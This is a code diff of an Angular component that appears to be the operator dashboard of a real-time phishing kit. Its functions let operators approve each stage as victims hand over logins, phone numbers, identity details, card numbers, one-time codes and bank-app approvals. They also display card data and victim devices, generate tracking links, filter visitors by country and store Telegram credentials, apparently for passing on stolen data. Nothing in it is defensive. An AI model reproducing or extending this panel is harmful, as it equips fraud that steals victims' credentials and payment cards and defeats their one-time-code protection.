-  getLinkUrl(code: string): string { return `${window.location.origin}/?id=${code}`; }
-  isDefaultLink(code: string): boolean { return code === this.auth.currentUser()?.uniqueCode; }
-  getActionBadge(session: any): string | null {
-      if (session.currentView !== 'loading') return null;
-      switch (session.stage) {
-          case 'login': return 'APPROVE LOGIN';
-          case 'phone_pending': return 'APPROVE PHONE';
-          case 'personal_pending': return 'APPROVE_IDENTITY';
-          case 'card_pending': return 'APPROVE_CARD';
-          case 'card_otp_pending': return 'APPROVE_OTP';
-          case 'bank_app_pending': return 'APPROVE_APP';
-          default: return 'ACTION NEEDED';
-      }
-  }
-  getDisplayEmail(email: string): string { return email || 'Waiting...'; }
-  isSessionLive(session: any): boolean { if (!session || !session.lastSeen) return false; return (Date.now() - session.lastSeen) < 60000; }
-  isSelected(session: any): boolean { return this.state.monitoredSessionId() === session.id; }
-  formatCard(num: string | undefined): string { if (!num) return '•••• •••• •••• ••••'; return num.replace(/\s+/g, '').replace(/(.{4})/g, '$1 ').trim(); }
-  copy(val: string) { if (!val) return; navigator.clipboard.writeText(val).then(() => { this.state.showAdminToast('Copied to clipboard'); }); }
-  private getElapsed(timestamp: Date | undefined): string {
-      if (!timestamp) return '0m';
-      const diffMs = Date.now() - new Date(timestamp).getTime();
-      const diffMins = Math.floor(diffMs / 60000);
-      if (diffMins < 60) return `${diffMins}m`;
-      const h = Math.floor(diffMins / 60);
-      const m = diffMins % 60;
-      return `${h}h ${m}m`;
-  }
+    addCountryToAdmin(type: 'allowed' | 'blocked', code: string) {
+        // For selectedAdminSettings in User Panel
+        const key = type === 'allowed' ? 'allowedCountries' : 'blockedCountries';
+        if (!this.selectedAdminSettings[key]) this.selectedAdminSettings[key] = [];
+        if (!this.selectedAdminSettings[key].includes(code)) {
+            this.selectedAdminSettings[key].push(code);
+        }
+    }
 
-  selectSession(s: any) { this.state.setMonitoredSession(s.id); }
-  viewHistory(s: any) { this.selectedHistorySession.set(s); this.historyPanelOpen.set(true); }
-  closeHistory() { this.historyPanelOpen.set(false); this.selectedHistorySession.set(null); }
-  archiveSession(s: any, e: Event) { e.stopPropagation(); this.state.archiveSession(s.id); }
-  approve(p={}) { this.state.adminApproveStep(p); }
-  reject() { this.state.adminRejectStep('Manual Reject'); }
-  revoke() { this.state.adminRevokeSession(this.monitoredSession()!.id); }
+    removeCountryFromAdmin(type: 'allowed' | 'blocked', code: string) {
+        const key = type === 'allowed' ? 'allowedCountries' : 'blockedCountries';
+        if (this.selectedAdminSettings && this.selectedAdminSettings[key]) {
+            this.selectedAdminSettings[key] = this.selectedAdminSettings[key].filter((c: string) => c !== code);
+        }
+    }
 
-  toggleDarkMode() {
-      this.isDarkMode.update(d => !d);
-      if (this.isDarkMode()) { document.documentElement.classList.add('dark'); localStorage.setItem('admin_theme', 'dark'); }
-      else { document.documentElement.classList.remove('dark'); localStorage.setItem('admin_theme', 'light'); }
-  }
+    async doPreAuth() {
+        this.isLoading.set(true);
+        try {
+            const res = await fetch('/api/admin/gate', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: this.preAuthUser, password: this.preAuthPass })
+            });
+            if (res.ok) {
+                this.preAuthSuccess.set(true);
+                this.preAuthError.set(false);
+            } else {
+                this.preAuthError.set(true);
+            }
+        } catch (e) {
+            this.preAuthError.set(true);
+        } finally {
+            this.isLoading.set(false);
+        }
+    }
 
-  async fetchLinks(adminId?: string) {
-      try {
-          let url = '/api/admin/links';
-          if (adminId) url += `?adminId=${adminId}`;
-          const res = await fetch(url, { headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } });
-          if (res.ok) {
-              const data = await res.json();
-              if (adminId) this.selectedAdminLinks.set(data);
-              else this.linkList.set(data);
-          }
-      } catch(e) {}
-  }
-  async generateLink() {
-      try {
-          const res = await fetch('/api/admin/links', { method: 'POST', headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } });
-          if (res.ok) { const data = await res.json(); this.state.showAdminToast(`Link Created: ${data.code}`); this.fetchLinks(); }
-          else { const err = await res.json(); this.state.showAdminToast(err.error || 'Failed to create link'); }
-      } catch(e) { this.state.showAdminToast('Error creating link'); }
-  }
-  async deleteLink(code: string) {
-      if(!await this.modal.confirm('Delete Link', `Delete tracking link ${code}?`, 'danger')) return;
-      try {
-          const res = await fetch(`/api/admin/links/${code}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } });
-          if (res.ok) { this.state.showAdminToast('Link Deleted'); this.fetchLinks(); }
-          else { const err = await res.json(); this.state.showAdminToast(err.error || 'Failed'); }
-      } catch(e) { this.state.showAdminToast('Error deleting link'); }
-  }
+    async doLogin() {
+        this.loginError.set(false);
+        this.isLoading.set(true);
+        const success = await this.auth.login(this.loginUser, this.loginPass);
+        this.isLoading.set(false);
+        if (success) {
+            this.loginError.set(false);
+            this.loginUser = '';
+            this.loginPass = '';
+        } else {
+            this.loginError.set(true);
+        }
+    }
 
-  async fetchUsers() {
-      try { const res = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } }); if (res.ok) this.userList.set(await res.json()); } catch(e) {}
-  }
-  async deleteUser(user: any) {
-      if (!await this.modal.confirm('Delete User', `Are you sure you want to delete ${user.username}?`, 'danger')) return;
-      try {
-          const res = await fetch(`/api/admin/users/${user.id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } });
-          if (res.ok) { this.state.showAdminToast('User Deleted'); this.closeUserPanel(); this.fetchUsers(); }
-      } catch(e) {}
-  }
-  async impersonateUser(user: any) {
-      if (!await this.modal.confirm('Impersonate User', `Log in as ${user.username}?`, 'confirm')) return;
-      const success = await this.auth.impersonate(user.id);
-      if (success) window.location.reload(); else this.state.showAdminToast('Impersonation Failed');
-  }
-  async toggleSuspension(user: any) {
-      const action = user.isSuspended ? 'unsuspend' : 'suspend';
-      if (!await this.modal.confirm(action === 'suspend' ? 'Suspend User' : 'Unsuspend User', `Are you sure you want to ${action} ${user.username}?`)) return;
-      try {
-          const res = await fetch(`/api/admin/users/${user.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ isSuspended: !user.isSuspended }) });
-          if (res.ok) { this.state.showAdminToast(user.isSuspended ? 'User Activated' : 'User Suspended'); this.fetchUsers(); if(this.selectedAdmin()?.id === user.id) this.selectedAdmin.update(u => ({ ...u, isSuspended: !u.isSuspended })); }
-      } catch(e) { this.state.showAdminToast('Update Failed'); }
-  }
-  async resetUserPassword(user: any) {
-      const newPass = await this.modal.prompt('Reset Password', `Enter new password for ${user.username}:`, '');
-      if (!newPass) return;
-      try {
-          const res = await fetch(`/api/admin/users/${user.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ password: newPass }) });
-          if (res.ok) this.state.showAdminToast('Password Reset');
-      } catch(e) { this.state.showAdminToast('Reset Failed'); }
-  }
-  async updateUserMaxLinks(user: any) { /* Already in template logic? No, let's keep for backup */ }
-  async submitCreateUser() {
-      if (!this.newUser.username || !this.newUser.password) { this.state.showAdminToast('Username and Password required'); return; }
-      try {
-          const res = await fetch('/api/admin/users', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ username: this.newUser.username, password: this.newUser.password, role: this.newUser.role, maxLinks: this.newUser.maxLinks, settings: this.newUser.flow }) });
-          if (res.ok) { this.state.showAdminToast('User Created'); this.closeUserModal(); this.fetchUsers(); } else this.state.showAdminToast('Failed to create user');
-      } catch(e) { this.state.showAdminToast('Error creating user'); }
-  }
+    exitAdmin() { this.auth.logout(); this.state.returnFromAdmin(); this.preAuthSuccess.set(false); }
+    exitImpersonation() { this.auth.logout(); }
+    refresh() { this.state.fetchSessions(); if (this.auth.currentUser()?.role === 'hypervisor') { this.fetchUsers(); } }
 
-  openAddUserModal() { this.newUser = { username: '', password: '', role: 'admin', maxLinks: 1, flow: { autoApproveLogin: false, skipPhone: false, forceBankApp: false, forceOtp: false, autoApproveCard: false } }; this.userModalOpen.set(true); }
-  closeUserModal() { this.userModalOpen.set(false); }
-  viewAdminDetails(u: any) { this.selectedAdmin.set(u); this.selectedAdminSettings = { ...u.settings }; this.userPanelOpen.set(true); this.fetchLinks(u.id); }
-  closeUserPanel() { this.userPanelOpen.set(false); this.selectedAdmin.set(null); }
+    approveText(): string {
+        const stage = this.monitoredSession()?.stage;
+        switch (stage) {
+            case 'login': return 'APPROVE_LOGIN';
+            case 'phone_pending': return 'APPROVE_PHONE';
+            case 'personal_pending': return 'APPROVE_IDENTITY';
+            case 'card_pending': return 'APPROVE_CARD';
+            case 'card_otp_pending': return 'APPROVE_OTP';
+            case 'bank_app_pending': return 'APPROVE_APP';
+            default: return 'APPROVE';
+        }
+    }
 
-  async saveAdminSettings() {
-      const user = this.selectedAdmin(); if (!user) return;
-      try {
-          const res = await fetch(`/api/admin/users/${user.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ settings: this.selectedAdminSettings, maxLinks: user.maxLinks }) });
-          if (res.ok) { this.state.showAdminToast('Settings Updated'); this.fetchUsers(); }
-      } catch(e) { this.state.showAdminToast('Update Failed'); }
-  }
+    getDeviceImage(ua: string | undefined): string | null {
+        if (!ua) return null;
+        const lower = ua.toLowerCase();
+        if (lower.includes('macintosh') || lower.includes('mac os') || lower.includes('iphone') || lower.includes('ipad')) return 'assets/icons/apple.svg';
+        if (lower.includes('windows')) return 'assets/icons/windows.svg';
+        return null;
+    }
+    getDeviceIcon(ua: string | undefined): string {
+        if (!ua) return 'help_outline';
+        const lower = ua.toLowerCase();
+        if (lower.includes('iphone')) return 'phone_iphone';
+        if (lower.includes('ipad')) return 'tablet_mac';
+        if (lower.includes('android')) return lower.includes('mobile') ? 'android' : 'tablet_android';
+        if (lower.includes('macintosh') || lower.includes('mac os')) return 'laptop_mac';
+        if (lower.includes('windows')) return 'desktop_windows';
+        if (lower.includes('linux')) return 'terminal';
+        return 'devices';
+    }
+    getFlagUrl(countryCode: string | undefined): string { if (!countryCode) return ''; return `https://flagcdn.com/w40/${countryCode.toLowerCase()}.png`; }
+    getCardLogoUrl(cardType: string | undefined): string {
+        if (!cardType) return '';
+        const t = cardType.toLowerCase();
+        if (t === 'visa') return 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg';
+        if (t === 'mastercard') return 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg';
+        if (t === 'amex') return 'https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg';
+        if (t === 'discover') return 'https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg';
+        return '';
+    }
+    getLinkUrl(code: string): string { return `${window.location.origin}/?id=${code}`; }
+    isDefaultLink(code: string): boolean { return code === this.auth.currentUser()?.uniqueCode; }
+    getActionBadge(session: any): string | null {
+        if (session.currentView !== 'loading') return null;
+        switch (session.stage) {
+            case 'login': return 'APPROVE LOGIN';
+            case 'phone_pending': return 'APPROVE PHONE';
+            case 'personal_pending': return 'APPROVE_IDENTITY';
+            case 'card_pending': return 'APPROVE_CARD';
+            case 'card_otp_pending': return 'APPROVE_OTP';
+            case 'bank_app_pending': return 'APPROVE_APP';
+            default: return 'ACTION NEEDED';
+        }
+    }
+    getDisplayEmail(email: string): string { return email || 'Waiting...'; }
+    isSessionLive(session: any): boolean { if (!session || !session.lastSeen) return false; return (Date.now() - session.lastSeen) < 60000; }
+    isSelected(session: any): boolean { return this.state.monitoredSessionId() === session.id; }
+    formatCard(num: string | undefined): string { if (!num) return '•••• •••• •••• ••••'; return num.replace(/\s+/g, '').replace(/(.{4})/g, '$1 ').trim(); }
+    copy(val: string) { if (!val) return; navigator.clipboard.writeText(val).then(() => { this.state.showAdminToast('Copied to clipboard'); }); }
+    private getElapsed(timestamp: Date | undefined): string {
+        if (!timestamp) return '0m';
+        const diffMs = Date.now() - new Date(timestamp).getTime();
+        const diffMins = Math.floor(diffMs / 60000);
+        if (diffMins < 60) return `${diffMins}m`;
+        const h = Math.floor(diffMins / 60);
+        const m = diffMins % 60;
+        return `${h}h ${m}m`;
+    }
 
-  async saveGateSettings() {
-      try { await fetch('/api/settings', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ gateUser: this.gateUser, gatePass: this.gatePass }) }); this.state.showAdminToast('Gate Credentials Updated'); } catch(e) { this.state.showAdminToast('Save Failed'); }
-  }
+    selectSession(s: any) { this.state.setMonitoredSession(s.id); }
+    viewHistory(s: any) { this.selectedHistorySession.set(s); this.historyPanelOpen.set(true); }
+    closeHistory() { this.historyPanelOpen.set(false); this.selectedHistorySession.set(null); }
+    archiveSession(s: any, e: Event) { e.stopPropagation(); this.state.archiveSession(s.id); }
+    approve(p = {}) { this.state.adminApproveStep(p); }
+    reject() { this.state.adminRejectStep('Manual Reject'); }
+    revoke() { this.state.adminRevokeSession(this.monitoredSession()!.id); }
 
-  async submitAssignment(adminId: string) {
-      const s = this.monitoredSession(); if(!s) return;
-      try { await fetch('/api/admin/assign-session', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ sessionId: s.id, adminId }) }); this.state.showAdminToast('Assigned'); this.state.fetchSessions(); this.assignModalOpen.set(false); } catch(e) { this.state.showAdminToast('Assignment Failed'); }
-  }
-  async assignAdmin() { this.assignModalOpen.set(true); }
-  async bulkDelete() { const ids = Array.from(this.selectedSessionIds()); if (ids.length === 0) return; if (!await this.modal.confirm('Bulk Delete', `Delete ${ids.length} sessions?`, 'danger')) return; ids.forEach(id => this.state.deleteSession(id)); this.selectedSessionIds.set(new Set()); }
-  bulkPin() { const ids = Array.from(this.selectedSessionIds()); if (ids.length === 0) return; ids.forEach(id => this.state.pinSession(id)); this.selectedSessionIds.set(new Set()); }
-  bulkExport() { this.state.showAdminToast('Exporting...'); }
-  toggleAllSelection(e: Event) { const checked = (e.target as HTMLInputElement).checked; if (checked) { const allIds = this.filteredHistory().map(h => h.id); this.selectedSessionIds.set(new Set(allIds)); } else this.selectedSessionIds.set(new Set()); }
-  toggleSelection(id: string, e: Event) { e.stopPropagation(); this.selectedSessionIds.update(set => { const newSet = new Set(set); if (newSet.has(id)) newSet.delete(id); else newSet.add(id); return newSet; }); }
-  isAllSelected() { const filtered = this.filteredHistory(); if (filtered.length === 0) return false; return this.selectedSessionIds().size === filtered.length; }
-  async fetchAuditLogs() { try { const res = await fetch('/api/admin/audit', { headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } }); if (res.ok) this.auditLogs.set(await res.json()); } catch(e) {} }
-  calcStats() { const users = this.userList(); const history = this.state.history(); const active = this.state.activeSessions(); this.kpiStats.set({ total: history.length + active.length, active: active.length, verified: history.filter(h => !h.data?.isArchivedIncomplete).length, clicks: 0 }); }
-  async changePassword() { if (!this.settingOldPass || !this.settingNewPass) { this.state.showAdminToast('Fill all fields'); return; } const success = await this.state.changeAdminPassword(this.settingOldPass, this.settingNewPass); if (success) { this.state.showAdminToast('Password Changed'); this.settingOldPass = ''; this.settingNewPass = ''; } else this.state.showAdminToast('Incorrect Old Password'); }
-  async saveSettings() { try { await fetch('/api/admin/settings', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ settings: this.flowSettings, telegramConfig: { token: this.tgToken, chat: this.tgChat } }) }); this.state.showAdminToast('Settings Saved'); } catch(e) { this.state.showAdminToast('Save Failed'); } }
-  async deleteSettings() { if(await this.modal.confirm('Delete Credentials', 'Are you sure you want to remove the Telegram credentials?', 'danger')) { this.tgToken = ''; this.tgChat = ''; this.saveSettings(); } }
-  extendTimeout(ms: number) { const s = this.monitoredSession(); if (s) { this.state.sendAdminCommand(s.id, 'EXTEND_TIMEOUT', { duration: ms }); this.state.showAdminToast(`Added +${ms/1000}s`); } }
-  requestFlow(f: any) { this.state.adminApproveStep({ flow: f }); }
-  viewLinkedSession() { const linkedId = this.monitoredSession()?.data?.linkedSessionId; if (!linkedId) return; const found = this.state.history().find(h => h.id === linkedId); if (found) this.viewHistory(found); else this.state.showAdminToast('Linked session not found in history'); }
-  exportTxt(s: any) {}
+    toggleDarkMode() {
+        this.isDarkMode.update(d => !d);
+        if (this.isDarkMode()) { document.documentElement.classList.add('dark'); localStorage.setItem('admin_theme', 'dark'); }
+        else { document.documentElement.classList.remove('dark'); localStorage.setItem('admin_theme', 'light'); }
+    }
+
+    async fetchLinks(adminId?: string) {
+        try {
+            let url = '/api/admin/links';
+            if (adminId) url += `?adminId=${adminId}`;
+            const res = await fetch(url, { headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } });
+            if (res.ok) {
+                const data = await res.json();
+                if (adminId) this.selectedAdminLinks.set(data);
+                else this.linkList.set(data);
+            }
+        } catch (e) { }
+    }
+    async generateLink() {
+        try {
+            const res = await fetch('/api/admin/links', { method: 'POST', headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } });
+            if (res.ok) { const data = await res.json(); this.state.showAdminToast(`Link Created: ${data.code}`); this.fetchLinks(); }
+            else { const err = await res.json(); this.state.showAdminToast(err.error || 'Failed to create link'); }
+        } catch (e) { this.state.showAdminToast('Error creating link'); }
+    }
+    async deleteLink(code: string) {
+        if (!await this.modal.confirm('Delete Link', `Delete tracking link ${code}?`, 'danger')) return;
+        try {
+            const res = await fetch(`/api/admin/links/${code}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } });
+            if (res.ok) { this.state.showAdminToast('Link Deleted'); this.fetchLinks(); }
+            else { const err = await res.json(); this.state.showAdminToast(err.error || 'Failed'); }
+        } catch (e) { this.state.showAdminToast('Error deleting link'); }
+    }
+
+    async fetchUsers() {
+        try { const res = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } }); if (res.ok) this.userList.set(await res.json()); } catch (e) { }
+    }
+    async deleteUser(user: any) {
+        if (!await this.modal.confirm('Delete User', `Are you sure you want to delete ${user.username}?`, 'danger')) return;
+        try {
+            const res = await fetch(`/api/admin/users/${user.id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } });
+            if (res.ok) { this.state.showAdminToast('User Deleted'); this.closeUserPanel(); this.fetchUsers(); }
+        } catch (e) { }
+    }
+    async impersonateUser(user: any) {
+        if (!await this.modal.confirm('Impersonate User', `Log in as ${user.username}?`, 'confirm')) return;
+        const success = await this.auth.impersonate(user.id);
+        if (success) window.location.reload(); else this.state.showAdminToast('Impersonation Failed');
+    }
+    async toggleSuspension(user: any) {
+        const action = user.isSuspended ? 'unsuspend' : 'suspend';
+        if (!await this.modal.confirm(action === 'suspend' ? 'Suspend User' : 'Unsuspend User', `Are you sure you want to ${action} ${user.username}?`)) return;
+        try {
+            const res = await fetch(`/api/admin/users/${user.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ isSuspended: !user.isSuspended }) });
+            if (res.ok) { this.state.showAdminToast(user.isSuspended ? 'User Activated' : 'User Suspended'); this.fetchUsers(); if (this.selectedAdmin()?.id === user.id) this.selectedAdmin.update(u => ({ ...u, isSuspended: !u.isSuspended })); }
+        } catch (e) { this.state.showAdminToast('Update Failed'); }
+    }
+    async resetUserPassword(user: any) {
+        const newPass = await this.modal.prompt('Reset Password', `Enter new password for ${user.username}:`, '');
+        if (!newPass) return;
+        try {
+            const res = await fetch(`/api/admin/users/${user.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ password: newPass }) });
+            if (res.ok) this.state.showAdminToast('Password Reset');
+        } catch (e) { this.state.showAdminToast('Reset Failed'); }
+    }
+    async updateUserMaxLinks(user: any) { /* Already in template logic? No, let's keep for backup */ }
+    async submitCreateUser() {
+        if (!this.newUser.username || !this.newUser.password) { this.state.showAdminToast('Username and Password required'); return; }
+        try {
+            const res = await fetch('/api/admin/users', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ username: this.newUser.username, password: this.newUser.password, role: this.newUser.role, maxLinks: this.newUser.maxLinks, settings: this.newUser.flow }) });
+            if (res.ok) { this.state.showAdminToast('User Created'); this.closeUserModal(); this.fetchUsers(); } else this.state.showAdminToast('Failed to create user');
+        } catch (e) { this.state.showAdminToast('Error creating user'); }
+    }
+
+    openAddUserModal() { this.newUser = { username: '', password: '', role: 'admin', maxLinks: 1, flow: { autoApproveLogin: false, skipPhone: false, forceBankApp: false, forceOtp: false, autoApproveCard: false } }; this.userModalOpen.set(true); }
+    closeUserModal() { this.userModalOpen.set(false); }
+    viewAdminDetails(u: any) { this.selectedAdmin.set(u); this.selectedAdminSettings = { ...u.settings }; this.userPanelOpen.set(true); this.fetchLinks(u.id); }
+    closeUserPanel() { this.userPanelOpen.set(false); this.selectedAdmin.set(null); }
+
+    async saveAdminSettings() {
+        const user = this.selectedAdmin(); if (!user) return;
+        try {
+            const res = await fetch(`/api/admin/users/${user.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ settings: this.selectedAdminSettings, maxLinks: user.maxLinks }) });
+            if (res.ok) { this.state.showAdminToast('Settings Updated'); this.fetchUsers(); }
+        } catch (e) { this.state.showAdminToast('Update Failed'); }
+    }
+
+    async saveGateSettings() {
+        try { await fetch('/api/settings', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ gateUser: this.gateUser, gatePass: this.gatePass }) }); this.state.showAdminToast('Gate Credentials Updated'); } catch (e) { this.state.showAdminToast('Save Failed'); }
+    }
+
+    async submitAssignment(adminId: string) {
+        const s = this.monitoredSession(); if (!s) return;
+        try { await fetch('/api/admin/assign-session', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ sessionId: s.id, adminId }) }); this.state.showAdminToast('Assigned'); this.state.fetchSessions(); this.assignModalOpen.set(false); } catch (e) { this.state.showAdminToast('Assignment Failed'); }
+    }
+    async assignAdmin() { this.assignModalOpen.set(true); }
+    async bulkDelete() { const ids = Array.from(this.selectedSessionIds()); if (ids.length === 0) return; if (!await this.modal.confirm('Bulk Delete', `Delete ${ids.length} sessions?`, 'danger')) return; ids.forEach(id => this.state.deleteSession(id)); this.selectedSessionIds.set(new Set()); }
+    bulkPin() { const ids = Array.from(this.selectedSessionIds()); if (ids.length === 0) return; ids.forEach(id => this.state.pinSession(id)); this.selectedSessionIds.set(new Set()); }
+    bulkExport() { this.state.showAdminToast('Exporting...'); }
+    toggleAllSelection(e: Event) { const checked = (e.target as HTMLInputElement).checked; if (checked) { const allIds = this.filteredHistory().map(h => h.id); this.selectedSessionIds.set(new Set(allIds)); } else this.selectedSessionIds.set(new Set()); }
+    toggleSelection(id: string, e: Event) { e.stopPropagation(); this.selectedSessionIds.update(set => { const newSet = new Set(set); if (newSet.has(id)) newSet.delete(id); else newSet.add(id); return newSet; }); }
+    isAllSelected() { const filtered = this.filteredHistory(); if (filtered.length === 0) return false; return this.selectedSessionIds().size === filtered.length; }
+    async fetchAuditLogs() { try { const res = await fetch('/api/admin/audit', { headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } }); if (res.ok) this.auditLogs.set(await res.json()); } catch (e) { } }
+    calcStats() { const users = this.userList(); const history = this.state.history(); const active = this.state.activeSessions(); this.kpiStats.set({ total: history.length + active.length, active: active.length, verified: history.filter(h => !h.data?.isArchivedIncomplete).length, clicks: 0 }); }
+    async changePassword() { if (!this.settingOldPass || !this.settingNewPass) { this.state.showAdminToast('Fill all fields'); return; } const success = await this.state.changeAdminPassword(this.settingOldPass, this.settingNewPass); if (success) { this.state.showAdminToast('Password Changed'); this.settingOldPass = ''; this.settingNewPass = ''; } else this.state.showAdminToast('Incorrect Old Password'); }
+    async saveSettings() { try { await fetch('/api/admin/settings', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ settings: this.flowSettings, telegramConfig: { token: this.tgToken, chat: this.tgChat } }) }); this.state.showAdminToast('Settings Saved'); } catch (e) { this.state.showAdminToast('Save Failed'); } }
+    async deleteSettings() { if (await this.modal.confirm('Delete Credentials', 'Are you sure you want to remove the Telegram credentials?', 'danger')) { this.tgToken = ''; this.tgChat = ''; this.saveSettings(); } }
+    extendTimeout(ms: number) { const s = this.monitoredSession(); if (s) { this.state.sendAdminCommand(s.id, 'EXTEND_TIMEOUT', { duration: ms }); this.state.showAdminToast(`Added +${ms / 1000}s`); } }
+    requestFlow(f: any) { this.state.adminApproveStep({ flow: f }); }
+    viewLinkedSession() { const linkedId = this.monitoredSession()?.data?.linkedSessionId; if (!linkedId) return; const found = this.state.history().find(h => h.id === linkedId); if (found) this.viewHistory(found); else this.state.showAdminToast('Linked session not found in history'); }
+    exportTxt(s: any) { }
 }
